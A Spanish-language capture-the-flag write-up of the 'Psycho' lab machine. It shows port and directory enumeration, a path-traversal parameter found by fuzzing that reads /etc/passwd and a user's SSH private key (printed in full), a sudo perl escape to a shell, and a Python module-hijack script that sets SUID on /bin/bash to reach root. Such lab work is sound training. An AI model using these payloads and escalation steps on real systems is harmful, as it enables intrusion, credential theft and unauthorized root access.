# Herramientas
- Nmap
- Gobuster
- Wfuzz
- GFTOBins
# 1. Ejecutar la máquina
Para ejecutar la máquina, se debe descomprimir el .zip y usar el comando:
```bash
sudo bash auto_deploy.sh psycho.tar
```

Una vez ejecutado, nos muestra la ip de la máquina:
```
Máquina desplegada, su dirección IP es --> 172.17.0.2
```

Para esto, debemos escanear con nmap los puertos de esta máquina, dándonos el siguiente resultado:
```bash
nmap -p- 172.17.0.2

Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-13 21:19 -04  
Nmap scan report for 172.17.0.2  
Host is up (0.000012s latency).  
Not shown: 65533 closed tcp ports (reset)  
PORT   STATE SERVICE  
22/tcp open  ssh  
80/tcp open  http  
MAC Address: 02:42:AC:11:00:02 (Unknown)  
  
Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
```

Esto nos indica que tienen el puerto 22 (SSH) y el puerto 80 (HTTP) abiertos. Inspeccionamos esta última y podemos ver que hay una página con un error al final de esta. Apretamos los botones y no sale ninguna ruta especial.
![[Pasted image 20250713212117.png]]

Al no haber nada sospechoso, decidimos ocupar gobuster para encontrar las rutas que contiene esta página web. Lo que hace este comando es, con un diccionario proporcionado ya por Kali Linux, buscar en la URL dada los directorios que contengan de terminación .php, .py, .txt y .html. 
```bash
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://172.1  
7.0.2 -x .php,.py,.txt,.html
```

Este sería el resultado, donde se puede ver que la página principal es un index.php y que contiene una carpeta llamada /assets. 
```
===============================================================  
Gobuster v3.6  
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  
===============================================================  
[+] Url:                     http://172.17.0.2  
[+] Method:                  GET  
[+] Threads:                 10  
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  
[+] Negative Status codes:   404  
[+] User Agent:              gobuster/3.6  
[+] Extensions:              html,php,py,txt  
[+] Timeout:                 10s  
===============================================================  
Starting gobuster in directory enumeration mode  
===============================================================  
/.php                 (Status: 403) [Size: 275]  
/index.php            (Status: 200) [Size: 2596]  
/.html                (Status: 403) [Size: 275]  
/assets               (Status: 301) [Size: 309] [--> http://172.17.0.2/assets/]  
/.php                 (Status: 403) [Size: 275]  
/.html                (Status: 403) [Size: 275]  
/server-status        (Status: 403) [Size: 275]  
Progress: 1038215 / 1038220 (100.00%)  
===============================================================  
Finished  
===============================================================
```

Al ingresar a la carpeta assets no encontramos nada más que una foto sin relevancia.
![[Pasted image 20250713212656.png]]

Debemos volver al inicio y recordar que existía un error, por lo que podemos suponer que se está llamando algo de forma incorrecta.
Para ello se debe realizar fuzzing para ver si existe algún parámetro. Con el siguiente comando se tiene lo siguiente:
- -c: Habilita el coloreado en la salida de comando
- --hc=404: Se debe ignorar los resultados con código de estado 404
- --hw 169: Se debe ignorar cualquier respuesta que tenga exactamente 169 caracteres de longitud. ste tipo de filtro puede ser útil para descartar respuestas estándar o mensajes de error que tengan una longitud fija (por ejemplo, cuando se está buscando una respuesta específica de un servidor web).
- -t 200: Limita el número de hilos concurrentes a 200. 
- ../../../../../../etc/passwd: Esta ruta intenta acceder a un archivo crítico del sistema, un archivo que contiene información sobre los usuarios del sistema en sistemas Unix. Se hace como prueba de path traversak para verificar si la aplicación permite el acceso no autorizado a archivos del sistema.
```bash
wfuzz -c --hc=404 --hw 169 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-mediu  
m.txt http://172.17.0.2/index.php?FUZZ=../../../../../../../../../../etc/passwd
```

Una vez terminado, nos muestra que el parámetro es "secret":
```
/usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might  
not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.  
********************************************************  
* Wfuzz 3.1.0 - The Web Fuzzer                         *  
********************************************************  
  
Target: http://172.17.0.2/index.php?FUZZ=../../../../../../../../../../etc/passwd  
Total requests: 207643  
  
=====================================================================  
ID           Response   Lines    Word       Chars       Payload                                                
=====================================================================  
  
000004819:   200        88 L     199 W      3870 Ch     "secret"                                               
  
Total time: 0  
Processed Requests: 207643  
Filtered Requests: 207642  
Requests/sec.: 0
```

Teniendo esta palabra se procede a acceder a la ruta anteriormente especificada y se obtienen los usuarios del sistema, en este caso siendo vaxei y luisillo.
![[Pasted image 20250713213606.png]]

Exploramos otros archivos comunes, en este caso /home/vaxei/.ssh/id_rsa, ¿por qué esta ruta? Porque aquí es donde se guarda la clave privada SSH en sistemas basados en linux.
Como podemos ver en la página, está la llave privada y debemos copiar este contenido en un nuevo archivo llamado id_rsa.
¡OJO ACÁ! Debe borrar los espacios extra y pegar todo en el archivo nuevo.
![[Pasted image 20250713213937.png]]
```bash
nano id_rsa

cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAvbN4ZOaACG0wA5LY+2RlPpTmBl0vBVufshHnzIzQIiBSgZUED5Dk
2LxNBdzStQBAx6ZMsD+jUCU02DUfOW0A7BQUrP/PqrZ+LaGgeBNcVZwyfaJlvHJy2MLVZ3
tmrnPURYCEcQ+4aGoGye4ozgao+FdJElH31t10VYaPX+bZX+bSxYrn6vQp2Djbl/moXtWF
ACgDeJGuYJIdYBGhh63+E+hcPmZgMvXDxH8o6vgCFirXInxs3O03H2kB1LwWVY9ZFdlEh8
t3QrmU6SZh/p3c2L1no+4eyvC2VCtuF23269ceSVCqkKzP9svKe7VCqH9fYRWr7sssuQqa
OZr8OVzpk7KE0A4ck4kAQLimmUzpOltDnP8Ay8lHAnRMzuXJJCtlaF5R58A2ngETkBjDMM
2fftTd/dPkOAIFe2p+lqrQlw9tFlPk7dPbmhVsM1CN+DkY5D5XDeUnzICxKHCsc+/f/cmA
UafMqBMHtB1lucsW/Tw2757qp49+XEmic3qBWes1AAAFiGAU0eRgFNHkAAAAB3NzaC1yc2
EAAAGBAL2zeGTmgAhtMAOS2PtkZT6U5gZdLwVbn7IR58yM0CIgUoGVBA+Q5Ni8TQXc0rUA
QMemTLA/o1AlNNg1HzltAOwUFKz/z6q2fi2hoHgTXFWcMn2iZbxyctjC1Wd7Zq5z1EWAhH
EPuGhqBsnuKM4GqPhXSRJR99bddFWGj1/m2V/m0sWK5+r0Kdg425f5qF7VhQAoA3iRrmCS
HWARoYet/hPoXD5mYDL1w8R/KOr4AhYq1yJ8bNztNx9pAdS8FlWPWRXZRIfLd0K5lOkmYf
6d3Ni9Z6PuHsrwtlQrbhdt9uvXHklQqpCsz/bLynu1Qqh/X2EVq+7LLLkKmjma/Dlc6ZOy
hNAOHJOJAEC4pplM6TpbQ5z/AMvJRwJ0TM7lySQrZWheUefANp4BE5AYwzDNn37U3f3T5D
gCBXtqfpaq0JcPbRZT5O3T25oVbDNQjfg5GOQ+Vw3lJ8yAsShwrHPv3/3JgFGnzKgTB7Qd
ZbnLFv08Nu+e6qePflxJonN6gVnrNQAAAAMBAAEAAAGADK57QsTf/priBf3NUJz+YbJ4NX
5e6YJIXjyb3OJK+wUNzvOEdnqZZIh4s7F2n+VY70qFlOtkLQmXtfPIgcEbjyyr0dbgw0j4
4sRhIwspoIrVG0NTKXJojWdqTG/aRkOgXKxsmNb+snLoFPFoEUHZDjpePFcgyjXlaYmZ0G
+bzNv0RNgg4eWZszE13jvb5B8XtDzN4pkGlGvK1+8bInlguLmktQKItXoVhhokGkp4b+fu
7YjDiaS4CyWsxX50wG/ZMgYBwFLRbCDUUdKZxsmCbreHxLKT/sae64E2ahuBSckYZlIzTd
2lp27EOOPvdPlt9gny83JuFHBLChMd4sHq/oU8vGAiGnIvOCWs4wMArbpJQ+EALJk3GYvh
oqWp3Q4N4F1tmwlrbqX2KP2T5yB+rLoBxfJwLELZlzd+O8mfP9Yknaw2vVYpUixUglNWHJ
ZnmN1uAScPAd1ZNvIkPm6IPcThj1hVCkFXgWjQn6NdJj+NGNWcBeUrxBkH0vToD7gfAAAA
wQCvSzmVYSxpX3b9SgH+sHH5YmOXR9GSc8hErWMDT9glzcaeEVB3O2iH/T+JrtUlm4PXiP
kwFc5ZHHZTw2dd0X4VpE02JsfkgwTEyqWRMcZHTK19Pry2zskVmu6F94sOcN8154LeQBNx
gT22Dr/KJA71HkOH7TyeGnlsmBtZoa3sqp3co9inkccnhm1KUeduL4RcSysDqXYbBUtNB6
G1l8HYysm8ISCsoR4KSgxmC5lqCMfBy7z/6nOX7sm5/kP+JMsAAADBAO8TiHrYTl/kGsPM
ITaekvQUJWCp+FCHK07jwzNp4buYAnO3iGvhVQpcS7UboD8/mve207e97ugK4Nqc68SzSu
bDgAnd4FF3NLoXP/qPZPaPS1FRl0pY0jHyB+U6RELgaI34i9AierMc+4M0coUMZvxqay3o
t8jRhz08jiwFifszwNN7taclmNEfkrKBY7nlbxFRd2XLjknZHFUOFzOFWdtXilQa+y6qJ6
lKtE9KWnQgIgZB9Wt+M3lsEVWEdQKN1wAAAMEAyyEsmbLUzkBLMlu6P4+6sUq8f68eP3Ad
bJltoqUjEYwe9KOf07G15W2nwbE/9WeaI1DcSDpZbuOwFBBYlmijeHVAQtJWJgZcpsOyy2
1+JS40QbCBg+3ZcD5NX75S43WvnF+t2tN0S6aWCEqCUPyb4SSQXKi4QBKOMN8eC5XWf/aQ
aNrKPo4BygXUcJCAHRZ77etVNQY9VqdwvI5s0nrTexbHM9Rz6O8T+7qWgsg2DEcTv+dBUo
1w8tlJUw1y+rXTAAAAEnZheGVpQDIzMWRlMDI2NmZmZA==
-----END OPENSSH PRIVATE KEY-----
```

Una vez copiada la llave privada, se debe otorgar permisos de acceso al archivo id_rsa, el número 600 indica que se tienen permisos de lectura y escritura, para luego acceder a través de ssh con el siguiente comando (recordar que vaxei es el usuario que logramos obtener anteriormente):
```bash
chmod 600 id_rsa

ssh -i id_rsa vaxei@172.17.0.2
Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.12.25-amd64 x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
This system has been minimized by removing packages and content that are  
not required on a system that users do not log into.  
  
To restore this content, you can run the 'unminimize' command.  
Last login: Sat Aug 10 02:25:09 2024 from 172.17.0.1  
vaxei@8ed499a601f1:~$ ls  
file.txt  
vaxei@8ed499a601f1:~$ cat file.txt    
kflksdfsad  
asdsadsad  
asdasd
```

Como podemos ver, no hay nada importante aquí. Por lo que procedemos a usar el comando `sudo -l` para ver cómo escalar privilegios como Luisillo.
```bash
sudo -l  
Matching Defaults entries for vaxei on 8ed499a601f1:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User vaxei may run the following commands on 8ed499a601f1:  
   (luisillo) NOPASSWD: /usr/bin/perl

```

Debemos dirigirnos a la página https://gtfobins.github.io/gtfobins/perl/#sudo para saber cómo hacer el escalado. En este caso, se ocupa el siguiente comando:
```bash
sudo -u luisillo /usr/bin/perl -e 'exec "/bin/sh";'  
$ whoami
luisillo
```

Para evitar que los comandos se registren se debe volver a iniciar la shell:
```bash
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
```

Al volver a realizar un `sudo -l`, se puede observar que podemos ejecutar comandos con todos los permisos, pero esto solo se puede ejecutando un archivo específico.
```bash
sudo -l  
Matching Defaults entries for luisillo on 8ed499a601f1:  
   env_reset, mail_badpass,  
   secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User luisillo may run the following commands on 8ed499a601f1:  
   (ALL) NOPASSWD: /usr/bin/python3 /opt/paw.py
```

Nos dirigimos a ese directorio y se ve que solamente está ese archivo.
```bash
cd ../../opt/  
luisillo@8ed499a601f1:/opt$ l  
paw.py  
luisillo@8ed499a601f1:/opt$ ls -la  
total 12  
drwxr-xrwx 1 root root 4096 Aug 10  2024 .  
drwxr-xr-x 1 root root 4096 Jul 14 01:19 ..  
-rw-r--r-- 1 root root  967 Aug 10  2024 paw.py
```

Al abrir el archivo, se puede ver que el script realiza varias tareas triviales. 
```
cat paw.py    
import subprocess  
import os  
import sys  
import time  
  
# F  
def dummy_function(data):  
   result = ""  
   for char in data:  
       result += char.upper() if char.islower() else char.lower()  
   return result  
  
# Código para ejecutar el script  
os.system("echo Ojo Aqui")  
  
# Simulación de procesamiento de datos  
def data_processing():  
   data = "This is some dummy data that needs to be processed."  
   processed_data = dummy_function(data)  
   print(f"Processed data: {processed_data}")  
  
# Simulación de un cálculo inútil  
def perform_useless_calculation():  
   result = 0  
   for i in range(1000000):  
       result += i  
   print(f"Useless calculation result: {result}")  
  
def run_command():  
   subprocess.run(['echo Hello!'], check=True)  
  
def main():  
   # Llamadas a funciones que no afectan el resultado final  
   data_processing()  
   perform_useless_calculation()  
      
   # Comando real que se ejecuta  
   run_command()  
  
if __name__ == "__main__":  
   main()
```

Se intenta ejecutar el archivo y se ve que hay un error. 
```
/usr/bin/python3 /opt/paw.py ls  
Ojo Aqui  
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.  
Useless calculation result: 499999500000  
Traceback (most recent call last):  
 File "/opt/paw.py", line 41, in <module>  
   main()  
 File "/opt/paw.py", line 38, in main  
   run_command()  
 File "/opt/paw.py", line 30, in run_command  
   subprocess.run(['echo Hello!'], check=True)  
 File "/usr/lib/python3.12/subprocess.py", line 548, in run  
   with Popen(*popenargs, **kwargs) as process:  
        ^^^^^^^^^^^^^^^^^^^^^^^^^^^  
 File "/usr/lib/python3.12/subprocess.py", line 1026, in __init__  
   self._execute_child(args, executable, preexec_fn, close_fds,  
 File "/usr/lib/python3.12/subprocess.py", line 1955, in _execute_child  
   raise child_exception_type(errno_num, err_msg, err_filename)  
FileNotFoundError: [Errno 2] No such file or directory: 'echo Hello!'
```

Ya que este archivo parece tener un error, nos podemos aprovechar de este y crear uno con el nombre que está buscando y explotarlo por ahí. Creamos un archivo llamado 'echo Hello!', pero al tener comillas genera errores y sale el mismo problema.

Podemos agregar nuestro directorio actual al path, usando:
```
export PATH=/opt:$PATH
```

Y además creamos un archivo llamado `subprocess.py`donde su contenido será un script que de permisos a cualquier usuario y este pueda ejecutar la bash como root.
```bash
nano subprocess.py

cat subprocess.py
import os;
os.system("chmod u+s /bin/bash")
```

Una vez hecho esto ejecutamos el archivo paw.py como root y podemos ver que tenemos un error. Pero esta vez tomó el archivo como el módulo que necesitaba.
```bash
sudo -u root /usr/bin/python3 /opt/paw.py    
Ojo Aqui  
Processed data: tHIS IS SOME DUMMY DATA THAT NEEDS TO BE PROCESSED.  
Useless calculation result: 499999500000  
Traceback (most recent call last):  
 File "/opt/paw.py", line 41, in <module>  
   main()  
 File "/opt/paw.py", line 38, in main  
   run_command()  
 File "/opt/paw.py", line 30, in run_command  
   subprocess.run(['echo Hello!'], check=True)  
   ^^^^^^^^^^^^^^  
AttributeError: module 'subprocess' has no attribute 'run'
```

Ahora, al hacer un `bash -p`, podemos observar que se obtuvo el root y de esta manera se logra vulnerar la máquina.
```bash
bash -p  
bash-5.2 # whoami  
root
```